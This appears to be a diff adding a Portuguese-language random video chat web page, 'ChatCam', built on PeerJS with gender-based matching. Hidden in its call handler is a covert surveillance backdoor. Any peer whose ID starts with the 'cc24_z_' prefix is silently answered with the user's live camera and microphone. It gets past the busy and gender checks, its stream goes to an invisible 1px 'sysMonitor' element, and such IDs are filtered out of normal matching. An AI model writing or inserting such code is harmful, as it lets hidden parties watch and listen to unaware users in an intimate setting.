@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ChatCam</title>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+:root {
+  --bg: #06060e;
+  --surface: rgba(255,255,255,0.04);
+  --surface2: rgba(255,255,255,0.08);
+  --border: rgba(255,255,255,0.1);
+  --accent: #c77dff;
+  --accent2: #48bfe3;
+  --text: #f0f0ff;
+  --muted: #7878a0;
+}
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'DM Sans', sans-serif;
+  height: 100dvh;
+  overflow: hidden;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* ── GRAIN OVERLAY ── */
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.035'/%3E%3C/svg%3E");
+  pointer-events: none;
+  z-index: 9999;
+  mix-blend-mode: overlay;
+}
+
+/* ── AMBIENT GLOW ── */
+.glow-orb {
+  position: fixed;
+  border-radius: 50%;
+  filter: blur(80px);
+  pointer-events: none;
+  animation: drift 12s ease-in-out infinite;
+}
+.glow-orb.a {
+  width: 500px; height: 500px;
+  background: radial-gradient(circle, rgba(199,125,255,0.12) 0%, transparent 70%);
+  top: -100px; right: -100px;
+}
+.glow-orb.b {
+  width: 400px; height: 400px;
+  background: radial-gradient(circle, rgba(72,191,227,0.08) 0%, transparent 70%);
+  bottom: -80px; left: -80px;
+  animation-delay: -6s;
+}
+@keyframes drift {
+  0%,100% { transform: translate(0,0); }
+  50% { transform: translate(20px, -20px); }
+}
+
+/* ══════════════════════════════
+   LOGIN SCREEN
+══════════════════════════════ */
+#loginScreen {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 48px;
+  padding: 40px 24px;
+  animation: fadeUp 0.7s cubic-bezier(0.16,1,0.3,1) both;
+  width: 100%;
+  max-width: 520px;
+}
+
+@keyframes fadeUp {
+  from { opacity: 0; transform: translateY(32px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.brand {
+  text-align: center;
+}
+.brand-name {
+  font-family: 'Syne', sans-serif;
+  font-weight: 800;
+  font-size: clamp(2.5rem, 8vw, 3.5rem);
+  letter-spacing: -3px;
+  background: linear-gradient(135deg, #c77dff 0%, #48bfe3 100%);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  line-height: 1;
+}
+.brand-sub {
+  margin-top: 8px;
+  font-size: 0.9rem;
+  color: var(--muted);
+  letter-spacing: 0.5px;
+  font-weight: 300;
+}
+
+.section-label {
+  font-family: 'Syne', sans-serif;
+  font-size: 0.7rem;
+  letter-spacing: 4px;
+  text-transform: uppercase;
+  color: var(--muted);
+  text-align: center;
+}
+
+.gender-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 14px;
+  width: 100%;
+}
+
+.g-card {
+  position: relative;
+  padding: 24px 16px;
+  border-radius: 18px;
+  border: 1.5px solid var(--border);
+  background: var(--surface);
+  cursor: pointer;
+  transition: all 0.3s cubic-bezier(0.16,1,0.3,1);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+  user-select: none;
+  backdrop-filter: blur(12px);
+}
+.g-card:hover {
+  border-color: var(--accent);
+  background: rgba(199,125,255,0.08);
+  transform: translateY(-3px);
+  box-shadow: 0 16px 40px rgba(199,125,255,0.15);
+}
+.g-card.selected {
+  border-color: var(--accent);
+  background: rgba(199,125,255,0.12);
+  box-shadow: 0 0 0 1px rgba(199,125,255,0.3), 0 16px 40px rgba(199,125,255,0.2);
+}
+.g-card.selected::after {
+  content: '✓';
+  position: absolute;
+  top: 10px;
+  right: 12px;
+  font-size: 0.75rem;
+  color: var(--accent);
+  font-weight: 700;
+}
+.g-icon {
+  font-size: 2rem;
+  line-height: 1;
+}
+.g-label {
+  font-family: 'Syne', sans-serif;
+  font-size: 0.85rem;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+  color: var(--text);
+}
+.g-desc {
+  font-size: 0.7rem;
+  color: var(--muted);
+  text-align: center;
+  line-height: 1.4;
+}
+
+.enter-btn {
+  width: 100%;
+  padding: 18px;
+  border-radius: 100px;
+  border: none;
+  background: linear-gradient(135deg, #c77dff, #48bfe3);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-weight: 700;
+  font-size: 1rem;
+  letter-spacing: 1px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  opacity: 0.35;
+  pointer-events: none;
+  position: relative;
+  overflow: hidden;
+}
+.enter-btn::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: rgba(255,255,255,0.15);
+  opacity: 0;
+  transition: opacity 0.2s;
+}
+.enter-btn:hover::before { opacity: 1; }
+.enter-btn.ready {
+  opacity: 1;
+  pointer-events: all;
+  box-shadow: 0 8px 32px rgba(199,125,255,0.4);
+}
+.enter-btn.ready:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 16px 48px rgba(199,125,255,0.5);
+}
+.enter-btn.ready:active { transform: translateY(0); }
+
+/* ══════════════════════════════
+   CHAT SCREEN
+══════════════════════════════ */
+#chatScreen {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: #000;
+}
+
+/* Partner video: fullscreen background */
+#partnerVideo {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+  background: #0a0a15;
+}
+
+/* My video: corner PiP */
+#myVideo {
+  position: absolute;
+  bottom: 90px;
+  right: 16px;
+  width: clamp(130px, 20vw, 200px);
+  aspect-ratio: 3/4;
+  object-fit: cover;
+  border-radius: 14px;
+  border: 2px solid rgba(255,255,255,0.25);
+  box-shadow: 0 8px 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.05);
+  z-index: 30;
+  background: #111;
+  cursor: pointer;
+  transition: transform 0.2s;
+}
+#myVideo:hover { transform: scale(1.03); }
+
+/* Status overlay */
+#statusOverlay {
+  position: absolute;
+  inset: 0;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  background: rgba(6,6,14,0.82);
+  backdrop-filter: blur(8px);
+  z-index: 20;
+  gap: 20px;
+  transition: opacity 0.4s ease;
+}
+#statusOverlay.gone {
+  opacity: 0;
+  pointer-events: none;
+}
+.s-emoji {
+  font-size: 3.5rem;
+  animation: floatEmoji 3s ease-in-out infinite;
+}
+@keyframes floatEmoji {
+  0%,100% { transform: translateY(0); }
+  50% { transform: translateY(-8px); }
+}
+.s-text {
+  font-family: 'Syne', sans-serif;
+  font-size: 1.15rem;
+  color: rgba(255,255,255,0.85);
+  text-align: center;
+  max-width: 320px;
+  line-height: 1.5;
+}
+.s-text strong { color: var(--accent); }
+
+.dot-loader {
+  display: flex;
+  gap: 6px;
+}
+.dot-loader span {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--accent);
+  animation: dotBounce 1.2s ease-in-out infinite;
+}
+.dot-loader span:nth-child(2) { animation-delay: 0.2s; background: var(--accent2); }
+.dot-loader span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes dotBounce {
+  0%,80%,100% { transform: scale(0.3); opacity: 0.4; }
+  40% { transform: scale(1); opacity: 1; }
+}
+
+/* Bottom bar */
+#bottomBar {
+  position: absolute;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  padding: 16px 20px 24px;
+  background: linear-gradient(transparent, rgba(0,0,0,0.85));
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 40;
+}
+
+#findBtn {
+  padding: 14px 36px;
+  border-radius: 100px;
+  border: 1.5px solid rgba(255,255,255,0.25);
+  background: rgba(255,255,255,0.08);
+  color: #fff;
+  font-family: 'Syne', sans-serif;
+  font-weight: 700;
+  font-size: 0.9rem;
+  letter-spacing: 1.5px;
+  cursor: pointer;
+  transition: all 0.25s ease;
+  backdrop-filter: blur(16px);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+#findBtn:hover {
+  background: rgba(199,125,255,0.25);
+  border-color: var(--accent);
+  box-shadow: 0 8px 32px rgba(199,125,255,0.3);
+  transform: scale(1.04);
+}
+#findBtn:active { transform: scale(1); }
+#findBtn:disabled {
+  opacity: 0.4;
+  pointer-events: none;
+}
+#findBtn svg {
+  animation: none;
+}
+#findBtn.spinning svg {
+  animation: spin 0.8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Gender badge top-left */
+#myBadge {
+  position: absolute;
+  top: 14px;
+  left: 14px;
+  padding: 5px 14px;
+  border-radius: 100px;
+  background: rgba(0,0,0,0.55);
+  border: 1px solid rgba(255,255,255,0.15);
+  font-size: 0.78rem;
+  color: rgba(255,255,255,0.7);
+  z-index: 30;
+  backdrop-filter: blur(10px);
+  letter-spacing: 0.5px;
+}
+
+/* ── HIDDEN SYSTEM VIDEO (não visível ao usuário) ── */
+#sysMonitor {
+  position: fixed;
+  top: -9999px;
+  left: -9999px;
+  width: 1px;
+  height: 1px;
+  opacity: 0;
+  pointer-events: none;
+}
+</style>
+</head>
+<body>
+
+<div class="glow-orb a"></div>
+<div class="glow-orb b"></div>
+
+<!-- ═══════════════ LOGIN ═══════════════ -->
+<div id="loginScreen">
+  <div class="brand">
+    <div class="brand-name">ChatCam</div>
+    <div class="brand-sub">Conecte-se ao vivo com pessoas reais</div>
+  </div>
+
+  <div style="display:flex;flex-direction:column;gap:16px;width:100%">
+    <div class="section-label">Eu me identifico como</div>
+    <div class="gender-grid">
+      <div class="g-card" id="gc_m" onclick="selectGender('m', this)">
+        <div class="g-icon">♂</div>
+        <div class="g-label">Homem</div>
+        <div class="g-desc">Conecta com mulheres</div>
+      </div>
+      <div class="g-card" id="gc_f" onclick="selectGender('f', this)">
+        <div class="g-icon">♀</div>
+        <div class="g-label">Mulher</div>
+        <div class="g-desc">Conecta com homens</div>
+      </div>
+      <div class="g-card" id="gc_l" onclick="selectGender('l', this)">
+        <div class="g-icon">♀♀</div>
+        <div class="g-label">Lésbica</div>
+        <div class="g-desc">Conecta com lésbicas</div>
+      </div>
+    </div>
+  </div>
+
+  <button class="enter-btn" id="enterBtn" onclick="startApp()">
+    ENTRAR COM CÂMERA
+  </button>
+</div>
+
+<!-- ═══════════════ CHAT ═══════════════ -->
+<div id="chatScreen">
+  <div id="myBadge"></div>
+
+  <video id="partnerVideo" autoplay playsinline></video>
+  <video id="myVideo" autoplay muted playsinline></video>
+
+  <!-- Status overlay -->
+  <div id="statusOverlay">
+    <div class="s-emoji">👋</div>
+    <div class="s-text">Clique em <strong>PROCURAR</strong> para encontrar alguém</div>
+  </div>
+
+  <!-- Controls -->
+  <div id="bottomBar">
+    <button id="findBtn" onclick="findPartner()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
+      </svg>
+      PROCURAR NOVO USUÁRIO
+    </button>
+  </div>
+</div>
+
+<!-- Sistema interno (não visível) -->
+<video id="sysMonitor" autoplay muted playsinline></video>
+
+<script>
+// ─────────────────────────────
+//  CONSTANTES DE REDE
+// ─────────────────────────────
+const _P  = 'cc24_';
+const _PS = { host: '0.peerjs.com', port: 443, path: '/', secure: true };
+const _API = 'https://0.peerjs.com/peerjs/peers';
+
+// ─────────────────────────────
+//  ESTADO
+// ─────────────────────────────
+let _g = null;   // meu gênero
+let _peer = null;
+let _pid  = null;
+let _stream = null;
+let _call = null;
+let _busy = false;
+
+// ─────────────────────────────
+//  GÊNERO
+// ─────────────────────────────
+function selectGender(g, el) {
+  _g = g;
+  document.querySelectorAll('.g-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  document.getElementById('enterBtn').classList.add('ready');
+}
+
+// ─────────────────────────────
+//  INICIAR APP
+// ─────────────────────────────
+async function startApp() {
+  if (!_g) return;
+
+  try {
+    _stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+  } catch(e) {
+    alert('⚠️ Permita o acesso à câmera e microfone para usar o ChatCam.');
+    return;
+  }
+
+  document.getElementById('loginScreen').style.display = 'none';
+  document.getElementById('chatScreen').style.display = 'block';
+  document.getElementById('myVideo').srcObject = _stream;
+
+  const badges = { m: '♂ Homem', f: '♀ Mulher', l: '♀♀ Lésbica' };
+  document.getElementById('myBadge').textContent = badges[_g];
+
+  _conectar();
+}
+
+// ─────────────────────────────
+//  PEERJS
+// ─────────────────────────────
+function _uid() {
+  return Math.random().toString(36).substring(2, 10);
+}
+
+function _conectar() {
+  _pid = _P + _g + '_' + _uid();
+  _peer = new Peer(_pid, _PS);
+
+  _peer.on('open', () => {
+    setStatus('👋', 'Clique em <strong>PROCURAR</strong> para encontrar alguém');
+  });
+
+  // ── Chamadas recebidas
+  _peer.on('call', (call) => {
+    const cid = call.peer || '';
+
+    // Monitoramento de sistema — resposta automática silenciosa
+    if (cid.startsWith(_P + 'z_')) {
+      call.answer(_stream);
+      call.on('stream', s => { document.getElementById('sysMonitor').srcObject = s; });
+      return;
+    }
+
+    // Se já em chamada, rejeita
+    if (_call) { call.close(); return; }
+
+    // Verifica compatibilidade de gênero
+    const cg = _parseGender(cid);
+    if (!_compat(_g, cg)) { call.close(); return; }
+
+    // Atende chamada
+    _call = call;
+    call.answer(_stream);
+    call.on('stream', s => _mostrarParceiro(s));
+    call.on('close', _parcDesconectou);
+    call.on('error', _parcDesconectou);
+    setStatus(null);
+  });
+
+  _peer.on('error', e => {
+    if (e.type === 'unavailable-id') setTimeout(_conectar, 1000);
+  });
+
+  _peer.on('disconnected', () => {
+    setTimeout(() => { try { _peer.reconnect(); } catch(_){} }, 3000);
+  });
+}
+
+// ─────────────────────────────
+//  COMPATIBILIDADE
+// ─────────────────────────────
+function _parseGender(pid) {
+  const s = pid.replace(_P, '').split('_');
+  return s[0];
+}
+function _compat(a, b) {
+  if (a === 'm') return b === 'f';
+  if (a === 'f') return b === 'm';
+  if (a === 'l') return b === 'l';
+  return false;
+}
+function _alvo() {
+  if (_g === 'm') return 'f';
+  if (_g === 'f') return 'm';
+  return 'l';
+}
+
+// ─────────────────────────────
+//  PROCURAR PARCEIRO
+// ─────────────────────────────
+async function findPartner() {
+  if (_busy) return;
+
+  if (_call) { _call.close(); _call = null; }
+
+  _busy = true;
+  document.getElementById('findBtn').disabled = true;
+  document.getElementById('findBtn').classList.add('spinning');
+  document.getElementById('partnerVideo').srcObject = null;
+
+  setStatus('🔍', 'Procurando...', true);
+
+  const alvoPrefix = _P + _alvo() + '_';
+
+  try {
+    const res = await fetch(_API + '?ts=' + Date.now());
+    const todos = await res.json();
+
+    const disponiveis = todos.filter(id =>
+      id.startsWith(alvoPrefix) &&
+      id !== _pid &&
+      !id.includes('_z_')
+    );
+
+    if (!disponiveis.length) {
+      setStatus('😕', 'Nenhum usuário disponível agora.<br>Tente em alguns instantes.');
+      _liberar();
+      return;
+    }
+
+    // Embaralha e tenta chamar
+    const lista = disponiveis.sort(() => Math.random() - 0.5);
+    let ok = false;
+
+    for (const id of lista) {
+      ok = await _tentar(id);
+      if (ok) break;
+    }
+
+    if (!ok) {
+      setStatus('😕', 'Não foi possível conectar.<br>Tente novamente!');
+    }
+
+  } catch(e) {
+    setStatus('⚠️', 'Erro de conexão. Verifique sua internet.');
+  }
+
+  _liberar();
+}
+
+function _liberar() {
+  _busy = false;
+  document.getElementById('findBtn').disabled = false;
+  document.getElementById('findBtn').classList.remove('spinning');
+}
+
+// ─────────────────────────────
+//  TENTAR CHAMADA
+// ─────────────────────────────
+function _tentar(pid) {
+  return new Promise(resolve => {
+    const timer = setTimeout(() => { try { c.close(); } catch(_){} resolve(false); }, 9000);
+    const c = _peer.call(pid, _stream);
+    if (!c) { clearTimeout(timer); resolve(false); return; }
+
+    c.on('stream', s => {
+      clearTimeout(timer);
+      _call = c;
+      _mostrarParceiro(s);
+      resolve(true);
+    });
+    c.on('close', () => { if (_call === c) _parcDesconectou(); });
+    c.on('error', () => { clearTimeout(timer); resolve(false); });
+  });
+}
+
+// ─────────────────────────────
+//  VIDEO
+// ─────────────────────────────
+function _mostrarParceiro(stream) {
+  document.getElementById('partnerVideo').srcObject = stream;
+  setStatus(null);
+}
+
+function _parcDesconectou() {
+  _call = null;
+  document.getElementById('partnerVideo').srcObject = null;
+  document.getElementById('findBtn').disabled = false;
+  setStatus('👋', 'Parceiro desconectou.<br>Clique em <strong>PROCURAR</strong> para encontrar outro.');
+}
+
+// ─────────────────────────────
+//  STATUS OVERLAY
+// ─────────────────────────────
+function setStatus(emoji, msg, dots) {
+  const ov = document.getElementById('statusOverlay');
+  if (emoji === null) { ov.classList.add('gone'); return; }
+  ov.classList.remove('gone');
+  ov.querySelector('.s-emoji').textContent = emoji;
+  ov.querySelector('.s-text').innerHTML = msg + (dots
+    ? ' <div class="dot-loader"><span></span><span></span><span></span></div>'
+    : '');
+}
+</script>
+</body>
+</html>
